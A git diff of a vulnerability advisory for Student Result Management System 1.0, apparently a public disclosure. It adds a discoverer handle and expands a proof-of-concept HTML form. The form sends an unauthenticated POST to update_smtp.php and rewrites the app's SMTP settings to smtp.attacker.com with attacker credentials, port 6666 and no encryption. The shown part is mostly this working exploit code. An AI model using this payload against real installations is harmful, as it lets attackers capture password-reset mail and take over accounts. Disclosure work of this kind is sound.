@@ -1,6 +1,6 @@
 # 🚨 SRMS 1.0 - Unauthenticated SMTP Hijacking to Account Takeover
 
-> **Discovered by**: [Your Name/Handle]  
+> **Discovered by**: yan1451  
 > **Date**: 2026-02-10  
 > **Target**: Student Result Management System (SRMS) 1.0  
 > **Severity**: Critical (CVSS ~9.1)  
@@ -57,21 +57,44 @@ The attacker uses a simple HTML form to send a forged POST request to the vulner
 
 **Exploit Code (`poc.html`):**
 
-```html
-<!DOCTYPE html>
+```<!DOCTYPE html>
 <html>
-<head><title>SRMS SMTP Exploit</title></head>
+<head>
+    <title>SRMS SMTP Hijacking PoC</title>
+    <style>
+        body { font-family: sans-serif; padding: 40px; background: #333; color: white; }
+        .exploit-box { border: 2px solid #ff0000; padding: 20px; background: #000; }
+        h2 { color: #ff0000; }
+        input[type=text] { width: 100%; padding: 10px; margin: 5px 0; }
+        input[type=submit] { background: #ff0000; color: white; padding: 15px; border: none; cursor: pointer; font-weight: bold; font-size: 16px; }
+    </style>
+</head>
 <body>
-    <h2>SRMS SMTP Configuration Hijack</h2>
-    <form action="http://localhost/srms/script/admin/core/update_smtp.php" method="POST">
-        <label>Hijack Server:</label>
-        <input type="text" name="mail_server" value="smtp.attacker.com">
-        <br>
-        <label>Hijack Username:</label>
-        <input type="text" name="mail_username" value="hacker@evil.com">
-        <br>
-        <input type="submit" value="Fire Payload">
-    </form>
+    <div class="exploit-box">
+        <h2>SMTP Configuration Hijack Exploit</h2>
+        <p>Target: /admin/core/update_smtp.php (Unauthenticated)</p>
+        
+        <form action="http://localhost/srms/script/admin/core/update_smtp.php" method="POST">
+            
+            <label>Mail Server (Hijacked):</label>
+            <input type="text" name="mail_server" value="smtp.attacker.com">
+            
+            <label>Username (Hijacked):</label>
+            <input type="text" name="mail_username" value="hacker@evil.com">
+            
+            <label>Password:</label>
+            <input type="text" name="mail_password" value="pwned123">
+            
+            <label>Port:</label>
+            <input type="text" name="mail_port" value="6666">
+            
+            <label>Security:</label>
+            <input type="text" name="mail_security" value="none">
+            
+            <br><br>
+            <input type="submit" value=">>> EXECUTE ATTACK (执行劫持) <<<">
+        </form>
+    </div>
 </body>
 </html>
 ```
